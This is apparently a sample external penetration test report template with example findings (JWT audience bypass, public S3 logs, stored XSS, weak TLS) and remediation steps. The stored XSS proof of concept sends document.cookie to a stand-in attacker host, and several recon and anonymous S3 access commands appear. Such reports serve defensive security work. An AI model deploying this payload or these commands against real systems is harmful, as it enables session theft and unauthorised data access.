# Professional Penetration Test Report (Sample)

This sample demonstrates the structure, tone, and depth used in a professional pentest report. Replace placeholders with your engagement details.

> Audience: executives, engineering, and security operations.

## Engagement Overview

- Engagement Name: <Client> External Penetration Test
- Report Date: 2025-10-17
- Assessment Window: 2025-10-10 → 2025-10-16
- Methodology: PTES, OWASP Testing Guide
- Testers: <Names>

## Executive Summary

Overall risk: High. Multiple high-impact vulnerabilities enable credential theft and lateral movement, including an authentication bypass on the API and misconfigured S3 bucket exposing sensitive data. Rapid remediation is recommended.

- High: 2 (Auth bypass, Sensitive data exposure)
- Medium: 3 (Stored XSS, Weak TLS, Verbose error leakage)
- Low: 3 (Information disclosure, Missing security headers, Clickjacking)

Business impact includes data exfiltration, account takeover, and potential regulatory exposure (PII).

## Scope

- In-scope hosts: `app.example.com`, `api.example.com`, `cdn.example.com`
- In-scope storage: `s3://example-public-assets`, `s3://example-prod-logs`
- Out-of-scope: Corporate VPN, Internal subnets, Non-production environments

## Methodology

1. Reconnaissance (OSINT, DNS, cert transparency, subdomain enumeration)
2. Mapping & Tech Fingerprinting (HTTP, TLS, headers, WAF)
3. Vulnerability Assessment (manual + tooling triage)
4. Exploitation & Validation (no destructive payloads)
5. Post-Exploitation (evidence collection, minimum necessary)
6. Reporting (risk, impact, remediation, validation steps)

## Risk Ratings

| Severity | Description |
|---|---|
| Critical | Immediate compromise with automated exploitation, broad impact |
| High | Likely exploitation with significant business impact |
| Medium | Exploitation requires conditions; limited impact |
| Low | Informational or minor misconfiguration |

We follow likelihood × impact and align with CVSS where applicable.

## Summary of Findings

| ID | Title | Severity | Affected Assets | Status |
|---|---|---|---|---|
| F-001 | Authentication Bypass via JWT Audience Mismatch | High | `api.example.com` | Confirmed |
| F-002 | Public S3 Bucket Exposes Logs with PII | High | `s3://example-prod-logs` | Confirmed |
| F-003 | Stored XSS in Support Ticket Comments | Medium | `app.example.com` | Confirmed |
| F-004 | Weak TLS Config (TLS 1.0, legacy ciphers) | Medium | `cdn.example.com` | Confirmed |
| F-005 | Verbose Error Leakage (Stack Traces) | Medium | `api.example.com` | Confirmed |
| F-006 | Missing Security Headers (CSP, HSTS) | Low | `app.example.com` | Confirmed |
| F-007 | Clickjacking (X-Frame-Options absent) | Low | `app.example.com` | Confirmed |
| F-008 | Info Disclosure via `.git` remnants | Low | `app.example.com` | Confirmed |

---

## Detailed Findings

### F-001 Authentication Bypass via JWT Audience Mismatch (High)

- Affected: `api.example.com`
- CWE: 287 Improper Authentication | OWASP A07:2021

#### Description
The API validates JWT signatures but does not verify the `aud` (audience) claim. Tokens issued for a different audience are accepted, enabling cross-application token reuse.

#### Impact
Attackers can authenticate as arbitrary users if they obtain a valid token from any sibling app sharing the issuer.

#### Evidence
```http
GET /api/v1/profile HTTP/1.1
Host: api.example.com
Authorization: Bearer <token issued for audience "web-portal">
```
Response: `200 OK` with user profile data.

#### Steps to Reproduce
1. Obtain a valid JWT for audience `web-portal` (legitimate login on sister app).
2. Send the token to `api.example.com`.
3. Observe successful authentication.

#### Remediation
- Enforce strict audience (`aud`) checking on all token verifiers.
- Consider `azp` (authorized party) validation where applicable.
- Add regression tests covering invalid `aud` values.

#### References
- OWASP: JSON Web Token (JWT) Cheat Sheet

---

### F-002 Public S3 Bucket Exposes Logs with PII (High)

- Affected: `s3://example-prod-logs`
- CWE: 200 Exposure of Sensitive Information

#### Description
S3 bucket permits `s3:GetObject` for anonymous principals. Logs include email addresses and IPs.

#### Evidence
```bash
aws s3 ls s3://example-prod-logs --no-sign-request
aws s3 cp s3://example-prod-logs/2025/10/16/app.log - --no-sign-request | head -n 5
```

#### Impact
Exposure of PII may trigger regulatory reporting (GDPR/CCPA). Data can be used for targeted attacks.

#### Remediation
- Set bucket policy to deny anonymous access.
- Enable Block Public Access at account and bucket levels.
- Rotate any derived secrets found in logs; minimize logging of PII.

---

### F-003 Stored XSS in Support Ticket Comments (Medium)

- Affected: `app.example.com`
- CWE: 79 Improper Neutralization of Input During Web Page Generation

#### Description
User-supplied HTML in comments is persisted and rendered without proper sanitization.

#### Proof of Concept
```html
<img src=x onerror="fetch('https://attacker.tld/'+document.cookie)" />
```

#### Impact
Session hijack, account takeover of staff reviewing tickets.

#### Remediation
- Sanitize user input server-side; encode on output by context.
- Adopt a strict Content Security Policy with nonce-based scripts.
- Add HTTPOnly and SameSite cookies; rotate session secrets.

---

### F-004 Weak TLS Config (Medium)

- Affected: `cdn.example.com`

#### Evidence
```bash
nmap --script ssl-enum-ciphers -p 443 cdn.example.com
```

#### Remediation
- Disable TLS 1.0/1.1; prefer TLS 1.2+/1.3.
- Remove `TLS_RSA_*` suites; use ECDHE with AEAD ciphers.
- Enable HSTS with preload.

---

## Attack Narrative (Timeline)

- Day 1: Recon revealed `api.example.com` and public S3 buckets.
- Day 2: Identified JWT audience gap; confirmed token reuse.
- Day 3: Verified S3 exposure; retrieved limited logs as evidence.
- Day 4: Discovered stored XSS and weak TLS on CDN.
- Day 5: Packed evidence, validated impact, drafted remediations.

## Strategic Recommendations

- Implement centralized JWT validation middleware (issuer, audience, azp, exp, nbf).
- Enforce S3 Block Public Access and SCP guardrails.
- Adopt secure-by-default headers via gateway (CSP, HSTS, XFO, Referrer-Policy).
- Add SAST/DAST gates and secret scanning to CI.

## Validation & Retest

Upon remediation, provide a staging endpoint or maintenance window for retest. Validation includes negative tests for token audience, bucket ACLs, and XSS filters.

## Appendix

### Tools Used
- nmap, ffuf, httpx, nuclei, Burp Suite
- awscli, jq, curl, openssl

### Sample Commands
```bash
# Subdomain enum
httpx -silent -status-code -title -tech -l subs.txt

# TLS scan
openssl s_client -connect cdn.example.com:443 -tls1
```

### CVSS Example
- F-001: 8.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

---

Prepared by <Your Name> | Hrishikesh’s Security Logs
